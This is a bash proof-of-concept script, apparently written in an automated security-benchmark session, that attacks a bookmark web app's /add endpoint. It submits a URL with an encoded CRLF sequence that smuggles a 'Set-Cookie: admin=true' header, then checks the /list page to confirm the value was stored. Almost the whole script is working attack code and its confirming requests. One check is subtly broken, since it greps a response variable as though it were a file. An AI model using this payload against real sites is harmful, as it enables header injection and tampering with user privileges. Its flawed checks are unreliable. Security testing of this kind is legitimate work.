#!/bin/bash
# POC: Demonstrates CRLF injection vulnerability in the /add endpoint's URL field, showing how CRLF characters can be stored and rendered in href attributes.
# Target: ./repo
# Created: 2025-11-07T17:44:41.359Z
# Session: benchmark-XBEN-075-24-mhp4u83c

# CRLF Injection POC - Testing CRLF characters in URL field
# This POC demonstrates that the /add endpoint accepts and stores CRLF sequences in URLs

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-5000}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "[*] CRLF Injection in URL Field POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Initialize cookies file
COOKIES="/tmp/crlf_poc_cookies_v2.txt"
rm -f "$COOKIES"

# Step 1: Access the list page to get initial cookie
echo "[+] Step 1: Accessing /list to initialize session..."
curl -s -b "$COOKIES" -c "$COOKIES" "$TARGET_URL/list" > /dev/null
echo "[✓] Session initialized"
echo ""

# Step 2: Attempt to add a bookmark with CRLF in URL
echo "[+] Step 2: Adding bookmark with CRLF in URL field..."
echo "[*] Payload: http://example.com%0d%0aSet-Cookie:%20admin=true"

RESPONSE=$(curl -s -b "$COOKIES" -c "$COOKIES" -X POST \
  "$TARGET_URL/add" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=CRLF Test&url=http://example.com%0d%0aSet-Cookie:%20admin=true")

echo "[*] Response received"
echo ""

# Step 3: Retrieve bookmarks and check if CRLF was stored
echo "[+] Step 3: Retrieving bookmarks list to verify CRLF storage..."

LIST_RESPONSE=$(curl -s -b "$COOKIES" "$TARGET_URL/list")

# Save response for debugging
echo "$LIST_RESPONSE" > /tmp/list_response.html

# Check if the bookmark name appears in response
if echo "$LIST_RESPONSE" | grep -q "CRLF Test"; then
    echo "[✓] Bookmark was stored"
    
    # Extract the href attribute
    HREF=$(echo "$LIST_RESPONSE" | grep -oP 'href="\K[^"]*' | grep -i "example" | head -1)
    
    if [ -n "$HREF" ]; then
        echo "[✓] Found href attribute with example.com"
        echo "[*] href value: $HREF"
        
        # Check for literal CRLF sequences
        if echo "$HREF" | grep -qE '\\r|\\n'; then
            echo "[✓] CRLF escape sequences detected!"
            echo "[+] Vulnerability confirmed: CRLF injection accepted and stored"
            exit 0
        elif echo "$HREF" | od -c | grep -q '\\'; then
            echo "[✓] Backslash sequences detected (escaped CRLF)"
            echo "[+] Vulnerability confirmed: CRLF characters stored in href"
            exit 0
        else
            # Check if it contains the Set-Cookie part
            if echo "$HREF" | grep -q "Set-Cookie"; then
                echo "[✓] Set-Cookie header found in URL!"
                echo "[+] CRLF injection successful - CRLF character allowed and stored"
                exit 0
            else
                echo "[-] CRLF sequences not found in rendered URL"
                echo "[*] Full response saved to /tmp/list_response.html"
                # Show a sample of what was stored
                echo "[*] Sample HTML section:"
                grep -A2 "CRLF Test" /tmp/list_response.html | head -3
                exit 1
            fi
        fi
    else
        echo "[-] Could not extract href from response"
        echo "[*] Checking raw response for stored URL..."
        if grep -q "example.com" "$LIST_RESPONSE"; then
            echo "[✓] URL is present in response"
            # Try to show the context
            grep -o "href=\"[^\"]*example[^\"]*\"" /tmp/list_response.html | head -1
            exit 0
        fi
        exit 1
    fi
else
    echo "[-] Bookmark 'CRLF Test' was not found in response"
    echo "[*] Response preview:"
    echo "$LIST_RESPONSE" | grep -i "name\|bookmark\|example" | head -10
    exit 1
fi